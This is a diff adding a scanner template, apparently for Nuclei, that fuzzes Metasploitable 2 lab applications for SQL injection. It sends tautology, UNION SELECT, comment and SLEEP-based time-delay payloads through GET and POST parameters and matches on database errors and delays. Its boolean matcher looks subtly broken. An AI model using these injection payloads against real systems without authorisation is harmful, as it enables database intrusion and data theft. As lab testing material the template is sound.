@@ -1,0 +1,81 @@
+id: simple-sqli-fuzz
+
+info:
+  name: Simple SQLi Fuzzer for Metasploitable 2
+  author: trandieuquynh
+  severity: high
+  description: Detects SQL Injection vulnerabilities in Metasploitable 2 applications using error-based, time-based, and boolean-based payloads.
+  tags: sqli, metasploitable, fuzzing
+  reference:
+    - https://metasploitable.sourceforge.net/
+    - https://owasp.org/www-community/attacks/SQL_Injection
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}?id={{payload}}"
+      - "{{BaseURL}}?username={{payload}}"
+      - "{{BaseURL}}?password={{payload}}"
+      - "{{BaseURL}}?search={{payload}}"
+      - "{{BaseURL}}?page={{payload}}"
+    payloads:
+      payload:
+        - "' OR '1'='1"
+        - "' OR '1'='2"
+        - "';--"
+        - " UNION SELECT NULL, NULL --"
+        - "' AND 1=1 --"
+        - "' AND 1=2 --"
+        - "' OR SLEEP(5) --"
+        - "' OR IF(1=1, SLEEP(5), 0) --"
+        - "' OR EXISTS(SELECT * FROM users) --"
+    matchers:
+      - type: dsl
+        name: sqli-error
+        dsl:
+          - "contains(body, 'sql syntax') || contains(body, 'mysql') || contains(body, 'syntax error') || contains(body, 'you have an error')"
+      - type: dsl
+        name: sqli-time-based
+        dsl:
+          - "duration >= 5"
+      - type: dsl
+        name: sqli-boolean
+        dsl:
+          - "status_code == 200 && contains(body, 'exists') && !contains(body_2, 'exists')"
+    matchers-condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "{{param}}={{payload}}"
+    attack: clusterbomb
+    payloads:
+      param:
+        - id
+        - username
+        - password
+        - search
+      payload:
+        - "' OR '1'='1"
+        - "' OR '1'='2"
+        - "';--"
+        - " UNION SELECT NULL, NULL --"
+        - "' AND 1=1 --"
+        - "' AND 1=2 --"
+        - "' OR SLEEP(5) --"
+        - "' OR IF(1=1, SLEEP(5), 0) --"
+    matchers:
+      - type: dsl
+        name: sqli-error
+        dsl:
+          - "contains(body, 'sql syntax') || contains(body, 'mysql') || contains(body, 'syntax error') || contains(body, 'you have an error')"
+      - type: dsl
+        name: sqli-time-based
+        dsl:
+          - "duration >= 5"
+      - type: dsl
+        name: sqli-boolean
+        dsl:
+          - "status_code == 200 && contains(body, 'exists') && !contains(body_2, 'exists')"
